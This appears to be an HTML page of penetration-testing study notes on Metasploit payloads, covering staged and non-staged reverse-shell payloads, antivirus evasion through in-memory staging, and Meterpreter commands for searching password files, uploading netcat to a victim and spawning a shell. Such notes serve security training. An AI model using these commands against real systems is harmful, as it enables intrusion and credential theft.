<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Payloads</title>
</head><body><b>Metasploit - Payloads<br/>
<br/>
Info:<br/>
<br/>
</b><b>Non-staged payloads: </b>sent in its entirety in one go. <b><br/>
</b><b><br/>
Staged payloads: <br/>
</b><br/>
Sent in two parts: <ul><li style="list-style-type: none"></li>
<li style="list-style-type: none">The first part is a small primary payload which causes the victim to connect back to the attacker and accept the secondary payloads</li>
<li style="list-style-type: none">The secondary payload contains the rest of the shellcode </li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
This can be useful when:<br/>
<ul><li style="list-style-type: none">The vulnerability we are exploiting does not have enough buffer space to hold a full payload. As the first part of a staged payload is typically smaller than a full payload, these smaller payloads can often save us in tight situations.</li>
</ul>
<ul><li style="list-style-type: none">Antivirus software is detecting embedded shellcode in an exploit. By replacing the embedded shellcode with a staged payload, we will be removing most of the malicious part of the shellcode and injecting it directly into the victim machine memory.</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
These can be told apart when choosing a payload by looking for the following: <br/>
<br/>
windows/<b>shell_reverse</b>_tcp - Connect back to attacker and spawn a command shell <br/>
<br/>
windows/<b>shell/reverse</b>_tcp - Connect back to attacker, Spawn cmd shell <b>(staged)<br/>
</b><b><br/>
<br/>
<br/>
Meterpreter Payload:<br/>
<br/>
</b><b>Info: </b><br/>
<br/>
- Selected by default<br/>
- Staged payload - the second part is a DLL file that is injected directly into memory - as it never touches the victim's file system, it is less likely to be caught by anti-virus. <br/>
<br/>
<b>Commands<br/>
<br/>
</b>meterpreter &gt; sysinfo<br/>
<br/>
meterpreter &gt; getuid<br/>
<br/>
meterpreter &gt; search -f *pass*.txt<br/>
<br/>
meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec<br/>
<br/>
meterpreter &gt; download c:\\Windows\\system32\\calc.exe /tmp/calc.exe<br/>
<b><br/>
</b>meterpreter &gt; shell<br/>
<br/>
<b>Note</b>: exiting out the spaned shell will return back to the meterpreter session. <b><br/>
</b><b><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</b></body></html>